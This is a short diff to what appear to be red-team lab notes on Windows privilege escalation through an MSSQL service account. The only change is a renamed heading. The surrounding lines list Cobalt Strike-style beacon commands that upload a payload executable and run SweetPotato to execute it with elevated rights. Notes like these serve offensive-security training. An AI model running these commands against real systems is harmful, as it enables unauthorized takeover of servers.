@@ -80,7 +80,7 @@ priv esc via MSSQL:
     we can enumerate these using whoami /priv
         beacon> getuid
         beacon run whoami /priv
-    using sweetpotato:
+    exploitation using sweetpotato:
         beacon> cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
         beacon> upload C:\Payloads\tcp-local_x64.exe
         beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
